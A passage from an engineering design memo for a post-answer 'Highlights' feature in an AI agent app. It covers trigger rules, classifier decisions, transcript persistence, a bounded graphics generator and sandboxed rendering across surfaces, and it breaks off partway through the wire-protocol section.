# Design: turn supplements — files and graphics after the final answer

Status: PROPOSED. This memo gates the implementation PRs. Base: `origin/main` @ `2b457ecddc`
(v0.68.18). UI is `local-operator-ui` `origin/main` `ec62c60` (read from the `asks-rail-896`
worktree, which is `ec62c60` plus #896). Mobile is `local-operator-mobile` ≈ `ec69437`
(the `store-shots` worktree). Author: architect, 2026-10-09.

**Provenance.** Every `file:line` is against those bases. Paths are `local_operator/…` unless
the line says UI (`src/…` in local-operator-ui) or native (`src/…` in local-operator-mobile).
Lines I re-checked with `sed`/`grep` in the worktrees on 2026-10-09 are cited bare. Facts I
took from the four scout sheets without re-reading are marked *(scout)*. Measurements made for
this memo (palette contrast, colour-vision-deficiency (CVD) separation, prelude bytes, prompt
tokens) were run from scratch scripts in the architect session's scratchpad and are reproduced
in the appendices. Anything I did not verify is listed as a **named probe** (§9) instead of
being asserted.

**How to read this.** §0 states the problem and maps each requirement to the section that
answers it. §1 gives the shape in one paragraph. §2 turns each settled choice into a contract.
§3 lists the exact seams per surface. §4 is security (it gates release). §5 is evidence and
QA. §6 is the lane decomposition. §7 is risks. §8 is out of scope. §9 lists probes. §10 is the
footprint statement. §11 holds the operator's open questions. Appendices A–C hold the
generator prompt, the palette and the prelude.

---

## 0. Problem

A final answer is prose. Two things it usually lacks:

1. **A clear list of the deliverables it produced or refers to** — the report it wrote, the
   CSV it exported. Those paths are scattered through tool calls, and the UI's condensed fold
   hides most of them.
2. **A picture of numeric or structured data** the conversation actually holds, when one
   would read faster than the prose.

The operator wants both, decided by a classifier at the final response and built by a
background fork. The constraints: **most turns get nothing**, the answer is never delayed or
failed, and the HTML is untrusted on every surface.

| # | Requirement (operator's, abbreviated) | Answered in |
|---|---|---|
| R1 | A decision at the FINAL RESPONSE on the classification cascade, using the yield machinery; pick the seam | §2.1, §2.3 |
| R2 | The decision says which files to call out and whether graphics help | §2.3, §2.4 |
| R3 | A forked, bounded, multi-turn generator; may produce more than one component; rendered inline | §2.5, §2.6 |
| R4 | A subtle "generating supporting graphics" line that can be cancelled, steered and restarted, reusing the image-gen states | §2.8, §2.9 |
| R5 | Default stylesheet from the UI's `--lo-*` tokens, theme-aware across all 59 themes, including live switches | §2.6, App. B/C |
| R6 | Per surface: UI/native/relay show HTML + files; TUI skips HTML silently, shows images inline, files as OSC 8 links | §2.7, §3 |
| R7 | Generator prompt and design guidelines live only in the fork | §2.5, App. A |
| R8 | Trigger only on a REAL user turn (not wake/monitor/peer/agent/goal/subagent); exec/SDK unaffected | §2.2 |
| C | Restraint, never delay or fail, security, honesty, persistence outside model context, model/cost, config, lanes | §2.3–§2.11, §4, §5, §6 |

**The names.**
- User-facing: **"Highlights"**. The row header reads "Highlights" (files plus graphics); the
  loading line reads "Preparing highlights…". The operator's own wording, "generating
  supporting graphics", is the fallback if design prefers it.
- Two conditions ride the name (round-1 design review D6): (a) the settled row always names its
  contents — counts and names (`2 files · 1 graphic`), never the bare word; (b) no new
  text-selection copy in the same window says "highlight", so the two senses cannot drift.
- "Highlights" stays the umbrella for the block; the files half reads as "Files" or as the
  contents themselves, never as "supporting graphics".
- Code name: keep **`supplement`**. Code reads `supplement`, `SupplementJob`, `supplement_v1`.
  The reason is that "supplement" names what the thing is to the turn (something attached
  after it), while "highlights" names what it is to the reader. Code needs the first and UI
  copy needs the second. A grep of core, UI and mobile finds no existing `supplement` symbol,
  only prose uses, so there is nothing to collide with.
- One run is a **supplement job**. Its outputs are **components** (HTML) and **callouts**
  (files).

---

## 1. What ships (one paragraph)

After a turn's `agent_end` has been emitted and its attention outcome published, a runtime
subscriber decides whether the turn was a **real user turn** (§2.2). If it was, a
deterministic pre-filter runs over the turn's own messages (§2.3). It collects candidate
deliverable files (minus a server-side sensitive-path denylist) and detects
numeric/structured evidence. Most turns stop there at zero cost.

If candidates exist, one decision call answers two typed questions:
- "Which of these files should be featured?" (up to 4 files)
- "Would a graphic help?"

The call goes to the existing classification `decide` cascade (Radient → TypeSafe →
OpenRouter). With no decision vendor, a heuristic answers the files question and graphics
are skipped.

The answer is written immediately as a durable `supplement_v1` custom entry anchored to the
final assistant message id. It never reaches the model.

If graphics were chosen, a background **supplement job** runs. It is a bounded, isolated,
multi-turn generator on a configurable design-capable model, with the guidelines in its own
prompt only. It emits `supplement_progress` events (the image-gen state vocabulary) and ends
by writing a new `supplement_v1` version. That version references the content-addressed
HTML blobs under the literal `"attachment"` key, so fork and move/sync carry them for free.

Each surface renders the components in an **opaque-origin sandbox**: `allow-scripts` only,
CSP `default-src 'none'`, no bridge, and a per-surface **navigation guard** that allows the
frame's initial load and denies every later navigation (Electron and native: stateful one-shot
guards; relay web, which has no interception point for a subframe navigation: a parent-page CSP
`frame-src data:` — declared in-document as a `<meta http-equiv>`, the only carriage the tunnel
does not strip (§2.7) — plus the second-`load` teardown — §4.1). A vendored prelude is injected
(stylesheet, tiny chart/table helpers, resize and theme glue). Theme tokens are pushed by
`postMessage`, so every theme and every live switch is covered without regenerating anything.
The TUI renders file callouts and any image components, and silently skips HTML.

Cancel, steer and restart are three new runtime ops scoped to the job. None of them touches
the turn.

---

## 2. Settled choices, elaborated into contracts

### 2.1 The seam: a detached post-`agent_end` runtime subscriber (goal-judge precedent)

**Options weighed:**

| Seam | Where | Verdict |
|---|---|---|
| A. `LoopConfig.on_before_yield` / `get_follow_up_messages` | `harness/loop.py:2301-2305`; `session.py:13412` | **Rejected.** Runs before `agent_end`. It delays the answer, holds notifications, and spends the 64-continuation follow-up budget (`types.py:2843,2851`) *(scout)*. |
| B. Inside `_run_turn` beside `_maybe_compact` | `session.py:13583` *(scout)* | **Rejected.** The end is *held* until this finishes (`_run_turn_pipeline` docstring, `session.py:12918-12927`), so any model call here delays `agent_end` and the sidebar checkmark. |
| C. Inside a tool call (ask-gate's `complete_clearance`) | `session.py:9371` *(scout)* | **Rejected.** The decision has no tool call to ride. Adding a tool is a schema tax on every request (AGENTS.md "tool-surface footprint ladder", `AGENTS.md:3846`). |
| D. `on_turn_settled` hook, last in the pipeline `finally` | `session.py:13076-13089`; runtime `_on_turn_settled` `serving.py:5622-5650` | **Viable trigger, but runs under `_turn_lock`.** Must only *schedule*, like `_schedule_completion_announce` does (`serving.py:5652-5677`). |
| E. Runtime event subscriber on `AgentEndEvent` (goal judge) | `serving.py:3100-3101` → `_maybe_judge_goal` `:3632-3671` | **Viable trigger.** It runs after the emitted end, and it is "installed at boot, before the first heartbeat and with no client attached" (`serving.py:3095-3099`), so it sees wake-opened turns too. |

**Choice: E as the observation point, with D's scheduling discipline.**

The subscriber at `serving.py:3100` gains a sibling of `_maybe_judge_goal`:
`_maybe_supplement(event)`. It is synchronous, every refusal returns silently, and it
schedules a task and never awaits one.

Why E over D: the subscriber hands over the **emitted** `AgentEndEvent`, already stamped by
`_emit` (`session.py:12549-12570`). That stamp includes `notify` and the cut-off
classification, and it carries `messages` (the run's `new_messages`, `harness/loop.py:2437`).
The judge has used this path in production, and it is the documented place where "the judge
must see every turn end".

At that moment the trigger set has already been consumed, though. `_run_triggers` is reset at
each pipeline head (`session.py:13005`). So the session must **freeze the facts** that §2.2
needs onto the end event or onto a per-run record that `_emit` captures. Contract:
`_emit` stores `self._last_run_provenance = RunProvenance(...)` beside
`self._attention_outcome` (`session.py:12566`), and the subscriber reads it through a
read-only accessor. `RunProvenance` carries the **logical turn's accumulated messages** —
every loop run of the pipeline (first run plus each `_drain_continuation` run,
`session.py:13828`), accumulated beside `_logical_generation` — because the held end is
replaced per run (`self._held_end = event`, `session.py:13496`) and would otherwise leave only
the LAST run's messages (round-1 review R2). The accumulator is reset at the **pipeline head**
beside `_run_triggers` (`session.py:13005-13008`) and is **not** cleared in `_flush_held_end`,
which clears `_logical_generation` at `:13100` *before* the `_emit` at `:13106` that freezes the
provenance — mirroring that neighbouring clear site freezes an empty accumulator and reproduces
R2 silently (round-2 review R2-5). It does **not** add a field to
`AgentEndEvent`; `extra="allow"` would make
that harmless (`types.py:1893`), but it would leak a private fact onto every viewer's wire.

**Ordering against notifications is structural.** `_flush_held_end` emits the end
(`session.py:13049`), `_publish_attention_outcome` follows (`:13050`), and the runtime's
completion banner is scheduled after both (`serving.py:5648`). The subscriber fires *during*
the end's emission, before the attention publish. That is safe only because the subscriber
merely **schedules**: the job's first await yields to the pipeline `finally`. As
belt-and-braces, the job's first statement is `await asyncio.sleep(0)` and then
`await session.turn_settled_event()` (a new `asyncio.Event`, set in the pipeline `finally`
after `on_turn_settled`). The answer, the attention marker and the banner therefore always
precede any supplement work.

### 2.2 "Real user turn" — the trigger predicate

There is no single origin enum *(scout, confirmed)*. The trigger set records
`"user" | "wake_prompt" | "monitor_prompt" | "internal"`, keyed on `custom_type`, never on
attribution (`session.py:11733-11756`). It is insufficient alone for two reasons:
- Goal-loop and judge continuations call `prompt(..., harness_injected=True)`
  (`serving.py:3451,3552`) and classify as `user`.
- Spooled owner prompts carry `InboxLine.harness_injected` (`runtime/inbox.py:237`) and reach
  `steer(..., harness_injected=True)` (`session.py:8259-8267`).

Both stamp `provider_payload[RENDERED_INJECTION_KEY]` (`session.py:8155`, `:8267`), which
`harness/rows.is_harness_injection` reads (`rows.py:237-273`).

**Definition.** A run is a *real user run* iff **all** of the following hold:

1. **A typed user row exists in this run.** At least one `Message(role="user")` among the
   run's inputs (opening messages *or* drained steers) has `custom_type is None` and no
   `RENDERED_INJECTION_KEY`. Recorded in `_note_run_input` as a new `_run_typed_user = True`,
   set in the existing `else` arm (`session.py:11755-11756`) only when
   `not rows.is_harness_injection(message)`.
2. **That user row is the last trigger.** The last input folded into the run whose class is
   not `internal` must be that typed user row (tracked as `_run_last_trigger`). This settles
   the mixed case precisely:
   - A missed-wake catch-up folded *before* the user's message (`initial = [catchup, user]`,
     `session.py:8112-8156`) → the user is last → **eligible**, because the answer is to the
     user.
   - A courtesy wake folded *after* the user's message, mid-turn → the wake is last →
     **ineligible**, because the final response is mostly answering the wake. This addresses
     scout risk 14 (gating on "contains user" would fire on wake-dominated turns).
3. **Not a subagent session.** `session._job_id is None` (`session.py:2939` *(scout)*).
4. **The run completed cleanly.** The emitted end has no `error`, is not `aborted`, and has no
   `cut_off_cause`, and the final assistant message is persisted (the anchor rule below).
5. **No goal loop is running.** `handle._goal_loop is None or not running`, and the run's
   opener was not a judge continuation. Rule 1 already excludes judge continuations; rule 5
   also covers `/loop` turns typed as the `/loop` seed.
6. **Not a headless one-shot host.** `session._one_shot_exit` is False
   (`session.py:15712-15731`; set by `run_print_mode`, `headless_print.py:601-604`).

**Coverage of the cases the brief names:**

| Case | Decision | Why (mechanism) |
|---|---|---|
| Typed prompt (TUI, desktop, relay, native) | eligible | rules 1-2 |
| User message + catch-up wake in one turn | eligible | user is the last trigger (`session.py:8156`) |
| User message, then a courtesy wake mid-turn | **not** eligible | the wake is the last non-internal trigger |
| Wake / monitor-only turn | not eligible | no typed user row |
| Peer `send`, hub/agent message, job result | not eligible | `internal` (`session.py:11753-11754`) |
| Queued ask answer (`ask_response`, attribution user) | **not** eligible | `custom_type` set → `internal`. The *answer* is the operator's, but the turn's final message responds to a question the agent raised. **Open question Q4** (§11) offers an opt-in. |
| Mid-turn typed steer | eligible, if it is the last trigger | drained steers pass through `_note_run_input` (`session.py:16004`) |
| Goal-loop / judge continuation, spooled owner chrome | not eligible | `RENDERED_INJECTION_KEY` |
| Spooled *real* owner prompt (sent during an update window) | eligible | `harness_injected` False on a typed spool row |
| Subagent run | not eligible | `_job_id` |
| `lop exec` text / `--json`, `run_print_mode` | not eligible | `_one_shot_exit` (rule 6). The text arm's stdout is the last assistant `MessageEnd` (`headless_print.py:260-265`); the `--json` arm dumps **every** event (`headless_print.py:209-218`), so rule 6 is load-bearing there, not belt-and-braces — §5.1 pins a no-`supplement_progress` assertion on it (round-1 review R7). |
| SDK `open_session(mode="own")` | **not eligible by default** | the SDK constructs `create_session` with no `ServingSessionHandle` (`sdk.py:584-590`), so the runtime subscriber (§2.1) is never installed. That absence is the contract: SDK event streams stay unchanged. |
| SDK `deliver()` to a runtime / `lop send` | eligible only if it carries a typed `PromptErrand` | it rides the runtime's ordinary prompt path |

**Host scope follows from the seam.** Only `ServingSessionHandle` hosts can trigger.
`spawn_owned_session` (`serving.py:9222`, used by `process.py:4860`) covers every
runtime-hosted conversation (TUI, desktop, phone). `exec_control.py:284` also builds one, but
rule 6 excludes it.

### 2.3 The decision: pre-filter, then two typed questions on the existing grammar

**Step 1 — deterministic pre-filter (no I/O beyond `stat`, ≤ 5 ms target).** Inputs: the
**logical turn's** messages — every loop run of the pipeline's accumulated `new_messages`
(first run plus all continuations), read from `RunProvenance` (§2.1) — plus the run's user
text. A turn that compacted and auto-continued therefore keeps its pre-compaction tool
results and file writes, which the held end alone would lose (round-1 review R2).

- **File candidates.** Paths appear in exactly three places:
  - `write`/`edit` tool-call args (key evidence);
  - `bash`/`eval` args under a recognised output flag (`-o`, `--output`, `> file`) — tier 2;
  - absolute or `~` paths with a known extension in the *final answer's* prose — tier 3.
  This mirrors the UI's two-tier admission rule (UI `mentioned-files.ts:1-60`: "admitted on
  evidence, never on resemblance"). The admission logic gets one Python home,
  `supplements/candidates.py`, and the UI keeps its own copy for its Files panel (that
  divergence is noted as a follow-up, not merged now).
- Each candidate must `stat` as a regular file under the session cwd or `~`.
- **Exclusions** (deliverables only):
  - the scratchpad (`LOCAL_OPERATOR_SCRATCHPAD`, `tools/search_guard.py:214`);
  - the config dir;
  - `/tmp`, `$TMPDIR`;
  - `.git/`, `node_modules/`, `.venv/`, `__pycache__/`, `.pytest_cache/`, `dist/`, `build/`;
  - `*.log`, `*.lock`, `*.pyc`;
  - any operator-configured deny prefix (`supplements.denyPrefixes`, §2.12) — the knob that
    makes the feature adoption-safe on a machine holding customer data (round-1 S-R8).
- **The sensitive denylist (§4.3)**, applied here before anything is listed, sent, or
  previewed.
- **Dedup against visible.** Drop a candidate whose path string appears verbatim in the
  final answer's text inside a markdown link or code span. It is already visible outside the
  fold (UI `turn-segments.ts:417-424,504-514` keeps the answer row visible).
- **Structured-data signal.** True iff the logical turn's tool results or final answer contain at
  least one of:
  - (a) a markdown/CSV/TSV table with ≥ 3 data rows and a numeric column;
  - (b) a JSON array of ≥ 3 objects sharing ≥ 1 numeric key;
  - (c) ≥ 4 numbers with a shared unit token in one paragraph of the answer.
  The extractor also yields the **evidence datasets** (§2.5) the generator is limited to.
- **Gate:** `candidates == [] and not structured` → **stop, no call** (`skipped="prefilter"`).
  This is expected to absorb the large majority of turns (a probe in §9 measures it).

**Step 2 — the decision call.** Does the existing grammar express both questions?
**Yes, with no Radient change.**

- **Files:** `decide` sends one `Question`, `kind="choice"`, with criteria
  `{option_id: description}` (`classification/types.py:114-140`). It answers one id and a
  probability map (`Answer.probabilities`, `types.py:147-162`). "Which of these files" is a
  multi-select. The recommend layer settled the same problem: "A decision model answers a
  typed question; it cannot emit a list", so it asks one `choice` per kind with an explicit
  `none` (`classification/recommend.py` docstring, `:1-30`).
  - **Contract here:** one `choice` question `supplement_files` with options
    `f1..fN` (N ≤ 12, the recommend layer's `maxCandidates` scale) plus `none`. The option
    text is the path's basename, its size, the tool that wrote it, and the writing tool
    call's one-line intent — **no directory** (the relative directory is the field that would
    carry the operator's client and project names to the decision vendor, and it does not
    help judge "is this the deliverable?"; round-1 security S-R8). All of it is harness-derived text (the
    classification-layer §6 rail: option text must be harness-owned,
    `classification-layer.md:421-427`).
  - **Featured set** = the chosen id **plus** every option whose probability is
    ≥ `FILE_PROB_FLOOR` (0.25) and ≥ ½ of the top probability, minus `none`, capped at
    `MAX_FEATURED` (4). The remainder is shown as "N more" (§2.8).
  - If `none` wins with p ≥ 0.5 → no files.
- **Graphics:** one `noul` question `supplement_graphics`, criteria
  `{"true": "...", "false": "..."}`. The rubric goes in the option descriptions (the measured
  reason, recommend.py docstring: 31/31 with the rubric versus 17/31 without). Graphics go
  ahead iff `value ≥ GRAPHICS_THRESHOLD` (0.7: precision over recall) **and** the pre-filter's
  structured signal is true. A model "yes" without evidence is overruled.
- **State:** the user's message (≤ 1.5k chars), the final answer (≤ 3k chars), and the
  evidence dataset titles and shapes (no rows). It is bounded through the same state cap and
  truncation marker as `monitors/classify.bounded_state`.
- **Transport:** `ClassificationService.decide(state=, question=)` (`service.py:399`) is
  per-question, with a per-question cache key (`_decide_key`, `service.py:276-287`). Two
  `decide` calls run concurrently (`asyncio.gather`) under the service's own timeout
  (`DEFAULT_TIMEOUT_MS=1500`, `service.py:186`). A batched two-question request would save
  roughly one instructions block per turn (recommend.py's own measure: "per-question
  instructions are the dominant fixed cost"). **Phase 2:** add a public `decide_many` to
  `ClassificationService` that sends both questions in one `DecisionRequest`. The vendor
  contract already takes `questions: {...}` as a map (`classification-layer.md` §3), so
  `decide_many` is local to the client and **still needs no Radient change**.
- **Fail-open:** a `None` answer from `decide` (disabled, circuit open, timeout, no leg —
  `service.py:405-439`) degrades to the heuristic (step 3).

**Step 3 — no-vendor degradation (heuristic).** If tier-1 candidates exist (written by
`write`/`edit` this run) and are not deduped, feature them by recency, capped at 4.
Graphics: **never** without a decision vendor. This is the brief's "heuristic file listing,
no HTML". A session-model fallback for the graphics question was considered and
**rejected**: it is ~100× the decision cost per eligible turn, and it is exactly the
"default-on spends money" surprise the welcome copy warns about (`tui/widgets/welcome.py:505`).

**Why not a forked session-model decision (the ask-gate shape)?** It would keep the prefix
cache warm (`_read_only_prompt`, `session.py:5498-5533`). But it costs a full-context cache
read per eligible turn, and on deepseek-flash fleets the decision quality of a 30k-token
read is not obviously better than Jev's on a 4k state. The warm-prefix fork stays a measured
alternative arm in the cost plan (§5.3), not the v1 path.

### 2.4 Persistence: one custom entry kind, versioned, anchored by id

**Choice:** an `ENTRY_CUSTOM` row written with `Transcript.append_custom(custom_type,
details)` (`transcript.py:1754-1769`). It is **not** a `CustomMessage` message row.

Reasons:
- Custom entries "never enter LLM context" (`transcript.py:1759`). `build_llm_history`
  ignores them, so there is zero prefix-cache effect and zero compaction weight.
  `_render_for_compaction` never sees them, so the `cut_not_replayable` hazard for
  non-persisted ids (`session.py:4536-4580` *(scout)*) cannot arise.
- It is the `stt_transcript_v1` precedent: a late, message-keyed sidecar record
  (`transcript.py:173-188`) for the same reason, "a message row cannot be rewritten post-hoc".
- A `CustomMessage` row would reach the model unless every renderer allow-list stayed shut
  (`harness/render.py:245`). That is one forgotten list away from a leak.

```jsonc
// {"id": "<uuid>", "ts": ..., "type": "custom", "payload": {"custom_type": "supplement_v1", "details": {...}}}
{
  "anchor": "<final assistant message id>",   // the attention anchor (session.py:11943)
  "job": "<job id, 12 hex>",                   // stable across versions of one anchor
  "version": 1,                                // 1..n; the newest version per anchor wins
  "state": "decided|queued|done|failed|cancelled|skipped",  // "running"/"cancelling" are live-only events, never journaled
  "files": [ {"path": "rel/report.md", "name": "report.md", "kind": "markdown",
              "size_bytes": 4120, "mtime": 1791..., "why": "written by write"} ],
              // paths are session-relative (or ~/-relative), resolved against the session
              // cwd at render time; never absolute, so the operator's directory layout does
              // not replicate to peers and the mesh (round-1 security S-R14)
  "files_more": 3,                             // the "N more" count; paths stored in "more"
  "more": ["rel/…", "…"],                     // ≤ 20, the same denylist applies; same relative form
  "components": [ {"attachment": "<32hex>",    // LITERAL KEY: network/sync.py:396 scans for it
                   "title": "Latency by region (ms)",
                   "source": "bench.csv rows 1-12 (tool result of bash at 10:41)",
                   "mime": "text/html", "height_hint": 320} ],  // the validator clamps height_hint to [120, 480] at write time (R8)
  "images": [ {"attachment": "<32hex>", "mime": "image/png", "title": "…"} ],  // optional
  "decision": {"vendor": "radient", "files_p": {...}, "graphics_p": 0.83, "skipped": null},
  "instruction": "make it a table",            // steer text that produced this version
  "model": "anthropic/claude-…", "turns": 2, "tokens_in": 9120, "tokens_out": 2210,
  "cost_usd": 0.0123, "error": "", "at": 1791...
}
```

**Lifecycle writes:**
- `version=1, state=decided` is written immediately after step 2, carrying files and
  (if graphics are coming) `state=queued`. File callouts therefore appear without waiting
  for the generator.
- The generator's terminal write is `version=k, state=done|failed|cancelled`.
- Intermediate `running`/`cancelling` **live-only event values** are never journaled,
  following image-gen's live-only progress precedent (`tools/image_tool.py:281-282`
  *(scout)*). The row's `state` enum carries only journaled values; readers map live
  transitions onto the same vocabulary (round-1 R10).

**Stale-row reader rule (frozen in C0).** A surface that reads the newest row for an anchor
whose `job` is not live in this runtime — the reaper cut it, or the reader is a cold one
(history page, reopened app) — renders a non-terminal row (`decided`/`queued`) as
`cancelled · Retry`; a row carrying `error="superseded"` renders nothing (§2.8). Live-state
knowledge is the runtime's `_supplement_task` registry. C0 ships the fixture `state=queued`,
no live job, that every lane asserts against (round-1 review R4).

**Blobs.** Component HTML (the generated body *without* the prelude, §2.6) is stored with
`AttachmentStore.put_bytes(raw, "text/html")` (`session/attachments.py:167-199`). That is
content-addressed, idempotent and never raises. It is **not** `cache_media`, which refuses
non-media kinds *(scout)*, and `AttachmentContent.kind` stays image/video/audio. **No change
to the attachment content contract.**

Using the literal `"attachment"` key means:
- move/sync's byte regex `rb'"attachment"\s*:\s*"([0-9a-f]{32})"'` (`network/sync.py:396`)
  finds and ships the blobs with no sync change;
- `/fork` copies the transcript, and the store is shared, so blobs need no work
  (`fork.py` docstring *(scout)*).

**Regeneration versions.** None exist in core today *(scout)*. Here a version is a new
`supplement_v1` row with the same `anchor` and `job` and `version+1`. Readers take the
newest per anchor. `_COLLAPSIBLE_CUSTOM_TYPES` (`transcript.py:361`) is **not** used: older
versions stay in the journal as an audit trail, and the newest-wins rule is a reader rule.

**Activity clock.** Add `supplement_v1` to `BOOKKEEPING_CUSTOM_TYPES` (`transcript.py:162-171`)
so a late supplement write does not re-rank a session as freshly worked. The append uses
`preserve_mtime=True`.

**Conversation forks.** A fork copies rows verbatim, so supplements come along. A new job
in the fork is a new `job` id. Nothing else is needed.

**Mesh/remote sessions — phased.**
- Rows: the desktop history reader serves journal rows. A peer conversation goes through
  `_remote_history` (`server/utils/desktop_sessions.py` `history` docstring, `:3282-3287`),
  so the row arrives.
- Bytes: `GET …/attachments/{digest}` returns **409 `attachment_on_peer`** for a digest that
  is not local *(scout)*. **v1 phases this:** a remote session shows file callouts as
  read-only text (no open/reveal) and components as "Available on <node>". A peer
  blob-fetch op is follow-up F2 (§8).
- After a move, the blobs travel (sync regex), so a moved conversation renders fully.

### 2.5 The generator: an isolated, bounded, multi-turn errand on its own model

**It does not reuse the session model by default.** The fleet mostly runs deepseek-flash
(brief). Visual-design quality is the generator's whole job.

**Model resolution** (`supplements.model`, default `"auto"`):
1. An explicit `provider/model_id` → use it if `ProviderController.usable_providers()`
   contains the provider (`providers/controller.py:661`).
2. `"auto"` → the first usable entry in `DESIGN_MODEL_LADDER`, a module constant reviewed per
   release beside the model catalogue. v1 order: Anthropic Sonnet-class, OpenAI GPT
   mid-class, Gemini Pro-class, then the operator's `subagents.models.hi` tier
   (`settings_io.py:2716`), then the session model.
3. A tier that resolves but cannot answer is demoted for the job, using the errand-tier
   pattern (`session.py:18200-18256`).

**Request shape.** This is `complete_once`'s *isolated* shape (`_errand_request`,
`session.py:18278-18320`), not the warm-prefix aside:
- `isolated=True`, `tools=[]`, `tool_choice="none"`, `replayable=False`, fast mode off;
- `purpose="supplement_render"`;
- `max_tokens=MAX_OUTPUT_TOKENS` (default 6000).

Why isolated: the generator needs the **evidence**, not the conversation. A warm-prefix
request would put a design prompt in the session's cache lineage, and on a different model
there is no prefix to share anyway. The system prompt is the Appendix A text: **972 o200k
tokens** (968 cl100k), measured with tiktoken 0.14 on this exact text. It is cache-stable
across jobs.

**Evidence.** The generator is given only:
- the user message (≤ 2k chars);
- the final answer (≤ 6k chars);
- the **evidence datasets**: `{id, title, source, columns, rows}` blocks the pre-filter
  extracted from the **logical turn's** tool results and featured files (§2.1, the same
  accumulator; ≤ 200 rows and ≤ 24 KB each, ≤ 64 KB total; text files only — CSV/TSV/JSON/
  markdown tables);
- for a steer, the user's instruction and the previous version's component sources.

Datasets pass through `scrub_shapes` (`redaction_shapes.py:5112`) before leaving the
process, the same redaction boundary classification-layer §6 requires for outbound state.

**Multi-turn, bounded.** `MAX_TURNS` defaults to 2:
- Turn 1 produces 0-3 `<component>` blocks (Appendix A grammar).
- The host validates each block (§4.2): parse, static denylist scan, size ≤ 48 KB, and every
  number in `<data>` must be present in evidence (§2.10).
- A block that fails is fed back once, as turn 2, with the precise validator error, together
  with any error reported by a headless render probe if one is configured (none in v1).
- Blocks that pass are kept. Turn 2's output replaces only the failed blocks.

**Hard bounds:**
- `TIMEOUT_S` 90 s wall for the whole job;
- `MAX_OUTPUT_TOKENS` 6000 per turn;
- `MAX_COMPONENTS` 3;
- `MAX_JOB_COST_USD` 0.20, a soft cap checked between turns against the ledger-priced
  snapshot. §5.3's envelope is **per job** (≈ $0.04-0.08 for the whole job, repair turn
  included), so 0.20 = **2 × the $0.08 high end of that per-job envelope + $0.04 of headroom**.
  It is not a per-turn figure with a third turn added, which is how the round-1 wording could
  be read (round-1 review R3; round-2 R2-6).
Any bound firing → `state=failed`, `error="bound:<name>"`, with valid blocks so far kept.

**Fail-open.** Every exception → `failed`, a debug log, and no notice. A generator failure is
never surfaced as an error in the transcript; the indicator settles to a quiet "Couldn't
prepare highlights · Retry" (§2.8).

### 2.6 Delivery and the vendored prelude (recommended)

**Choice: the host injects a vendored prelude. The model never writes CSS or chart code
unless it has to.**

The prelude is:
- `prelude.css`: token defaults, typography, table/SVG styles, the series palette as
  `--s1..--s6` per mode, and reduced motion;
- `prelude.js`: `LO.table/bar/line/el/fmt/color/onTheme/onSize/size`, plus the width-redraw
  and theme listener.

Measured on a working spike (Appendix C), after the round-2 label-layout fix — **2,044 B CSS +
8,180 B JS raw (minified build, esbuild 0.28.2); 4,538 B gzip combined** (one method for every
figure here: `cat` the pair through `gzip -9`; the spike's `BUILD.md` carries it, `measure.py`
re-derives it). Budget: **≤ 11 KB raw / ≤ 4.5 KB gzip** — 1,040 B and 70 B spare. Round 2 moved
the caps: D2-1's anchoring fix (measure the composed top-tick label, reserve its width, fall
back inside the plot when the space is short) plus D2-2/D2-4's label fitting cost **+474 B gzip /
+1,089 B raw** against the pre-fix pair through the same tool, and the old caps had 29 B of gzip
headroom. The caps are self-imposed; that fix is not. Any further addition must trim rather than
extend — the App. B guard (+412 B gzip) still does not fit.**

Trade-offs:

| | Prelude (recommended) | Model-written full documents |
|---|---|---|
| Output tokens per component | ~150-400 (a `<data>` block + a one-line helper call) | ~1,500-3,000 (CSS + chart code) |
| Theme correctness on 59 themes + live switch | guaranteed by the host (vars + `postMessage`) | depends on the model honouring vars |
| Honesty check | easy: data lives in a `<data>` JSON block, so the validator diffs numbers | hard: numbers buried in JS literals |
| Visual consistency across models | high (same helpers) | varies by model |
| Flexibility | helpers + a raw DOM/SVG escape hatch | unlimited |
| Security | no change (same sandbox either way) | same |

**Document assembly (the host, per surface, identical bytes).** The host builds:
```html
<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="<§4.1 policy>">
<style>{prelude.css}</style></head><body>
<script type="application/json" id="lo-data">{merged <data> JSON}</script>
{component body}<script>{prelude.js}</script>  <!-- the prelude is loaded BEFORE the body's inline scripts run: see note -->
</body></html>
```
Note: in the real assembly the prelude `<script>` is placed **before** the body so `LO` exists
when the component's inline script runs. The theme listener is installed synchronously, so
the first `postMessage` is never lost.

**One assembler implementation.** `supplements/document.py` builds the bytes. Two routes
serve them:
- desktop `GET /v1/desktop/sessions/{id}/supplements/{digest}/document`;
- relay `GET /api/sessions/{id}/supplements/{digest}/document`.

Both return the assembled document as JSON `{html}`, **not** as `text/html` (§4.1 explains
why the host must never navigate a frame to a same-origin URL).

Native fetches the same relay route. The prelude ships **inside core** (`supplements/prelude/`),
versioned with a `PRELUDE_VERSION`, so one fix reaches all four surfaces with no UI or mobile
release.

**Theme.** Each host posts `{lo:"supplement-host", t:"theme", mode, vars}`:
- at frame `load`;
- on every theme change: UI `applyThemeToDocument` (`themes/index.ts:238-245`), relay
  `dataset.theme` change, native `Uniwind` scheme change (`ui/appearance.tsx:45-81`).

`vars` holds **resolved values** from `getComputedStyle` (UI and relay) or `PALETTE[mode]`
(native, `ui/tokens.gen.ts:84`). It never carries a palette id, because native has only
light/dark (scout risk 11). Hosts post only names matching the `--lo-*`/`--font-*` shape and
values from their own token set; the frame applies values through the CSSOM behind a
`CSS.supports` gate — never interpolated into a `<style>` text node (round-1 security
S-R13) — whitelists the names, and caps each value at 120 chars. The frame also pins its own
ground to the pushed mode: `color-scheme` follows `data-mode` in the vendored CSS, so the UA
canvas never stays on the OS scheme under host light vars (round-1 design D8). The document
stays hidden until the first theme arrives; the `prefers-color-scheme` fallback after 400 ms
is a last resort, not the plan.

**The series palette** (Appendix B) is prelude-owned, so no UI palette-contract change is
needed for v1. It was checked against every UI theme (59) and every relay theme (31):
- non-text contrast ≥ 3.29:1 (light) and ≥ 4.08:1 (dark) on the four supplement grounds
  (canvas/surface/elevated/message-surface — `sunken` is excluded: Appendix B, round-1 D11);
- CVD separation ΔE76 ≥ 9.7 under deutan/protan/tritan simulation;
- meaning is never carried by colour alone (labels and dash patterns, Appendix A).

### 2.7 The wire

**Events (new family, not a synthetic tool).** The image-gen card is welded to tool rows:
`is_image_gen_tool(tool_name)` (`tui/widgets/tool_card.py:2491-2500` *(scout)*), UI `ToolRow`
(`canonical-transcript.tsx:1528-1548` *(scout)*), and phone/native allowlists keyed on
`generate_image`.

A **synthetic tool call** would:
- place a tool row after the answer, which breaks the UI fold (a tool row is work, so the
  trailing-statement walk stops at it; UI `turn-segments.ts:510-513`) and native condensing
  (`turn-condensing.ts:117-155`);
